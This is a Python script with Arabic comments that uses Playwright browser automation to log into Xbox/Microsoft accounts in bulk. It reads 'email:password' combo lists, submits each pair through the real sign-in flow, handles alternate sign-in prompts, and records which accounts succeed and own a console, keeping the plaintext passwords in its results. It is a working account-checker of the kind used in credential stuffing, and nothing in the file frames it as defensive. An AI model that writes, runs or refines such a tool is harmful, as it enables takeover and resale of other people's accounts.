# xbox_checker.py - نسخة مطابقة لمنطق 99999.py الناجح
import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    """نفس الوظيفة من 99999.py"""
    console_url = "https://www.xbox.com/en-US/play/consoles"
    best_priority = 4
    best_has_console = False
    best_message = "Unknown status"
    best_login_success = False
    
    for attempt in range(1, 4):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=60000)
            await asyncio.sleep(2)
            page_text_lower = (await page.inner_text('body')).lower()
            
            if "play your console remotely" in page_text_lower:
                return True, "يوجد جهاز (Play your console remotely)", True
            if "set up your console" in page_text_lower:
                if 2 < best_priority:
                    best_priority = 2
                    best_has_console = False
                    best_message = "مسجل ولا يوجد جهاز (Set up your console)"
                    best_login_success = True
                continue
            if "sign in to finish setting up" in page_text_lower:
                if 3 < best_priority:
                    best_priority = 3
                    best_has_console = False
                    best_message = "تسجيل دخول غير مكتمل (Sign in to finish setting up)"
                    best_login_success = False
                continue
        except Exception:
            continue
    return best_has_console, best_message, best_login_success

async def handle_password_entry(page, account_email: str, password: str) -> bool:
    """نفس وظيفة إدخال كلمة المرور من 99999.py"""
    try:
        # محاولة مباشرة
        try:
            await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=5000)
            await page.fill("input[type='password'], input[name='passwd']", password)
            await asyncio.sleep(5)
            return True
        except PlaywrightTimeoutError:
            pass
        
        # البحث عن "Sign in another way"
        try:
            another_way = page.locator("a:has-text('Sign in another way'), span:has-text('Sign in another way'), button:has-text('Sign in another way')").first
            if await another_way.count() > 0:
                await another_way.click(timeout=2000)
                await page.wait_for_load_state("networkidle")
        except:
            pass
        
        # البحث عن "Use your password"
        try:
            use_password = page.locator("a:has-text('Use your password'), span:has-text('Use your password'), button:has-text('Use your password')").first
            if await use_password.count() > 0:
                await use_password.click(timeout=2000)
                await page.wait_for_load_state("networkidle")
        except:
            pass
        
        # انتظار حقل كلمة المرور مرة أخرى
        await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
        await page.fill("input[type='password'], input[name='passwd']", password)
        await asyncio.sleep(5)
        return True
        
    except Exception:
        return False

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=['--no-sandbox', '--disable-dev-shm-usage']
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = await context.new_page()
        
        # نفس رابط تسجيل الدخول من 99999.py
        await page.goto("https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles", timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")
        
        # إدخال البريد الإلكتروني
        await page.wait_for_selector("input[type='email'], input[name='loginfmt']", timeout=DEFAULT_TIMEOUT)
        await page.fill("input[type='email'], input[name='loginfmt']", account['email'])
        
        # انتظار 7 ثواني كما في الكود الأصلي
        await asyncio.sleep(7)
        
        # النقر على زر Next
        try:
            next_btn = page.locator("input[type='submit'], input#idSIButton9, button:has-text('Next')").first
            await next_btn.click(timeout=5000)
        except:
            await page.keyboard.press("Enter")
        
        await page.wait_for_load_state("networkidle")
        
        # إدخال كلمة المرور باستخدام الدالة المتخصصة
        if not await handle_password_entry(page, account['email'], account['password']):
            result['console_info'] = "فشل في إدخال كلمة المرور"
            await browser.close()
            await p.stop()
            return result
        
        # النقر على زر تسجيل الدخول
        try:
            submit_btn = page.locator("input[type='submit'], input#idSIButton9, button:has-text('Next'), button:has-text('Sign in')").first
            await submit_btn.click(timeout=5000)
        except:
            await page.keyboard.press("Enter")
        
        await page.wait_for_load_state("networkidle")
        
        # التعامل مع "Stay signed in?"
        try:
            stay_btn = page.locator("input[value='Yes'], button:has-text('Yes')").first
            await stay_btn.click(timeout=3000)
        except:
            pass
        
        # التحقق من وجود جهاز
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
        
    except PlaywrightTimeoutError:
        result['console_info'] = "انتهت المهلة أثناء تسجيل الدخول"
        if p:
            await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()
    
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
